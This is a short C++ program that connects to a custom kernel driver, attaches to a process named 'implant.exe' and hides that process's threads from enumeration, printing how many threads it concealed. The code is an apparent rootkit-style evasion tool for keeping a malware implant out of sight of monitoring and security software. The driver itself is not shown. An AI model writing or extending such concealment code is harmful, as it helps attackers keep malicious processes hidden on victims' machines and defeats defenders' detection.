#include <cstdio>
#include <memory>
#include "../Memory/DriverInterface/driver_interface.hpp"

int main()
{
	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
		return 1;

	driver->attach( L"implant.exe" );

	if( auto hidden = driver->hide_threads() )
		printf( "[+] Hidden %u threads from enumeration.\n", *hidden );
	else
		printf( "[!] Failed to hide threads.\n" );

	return 0;
}
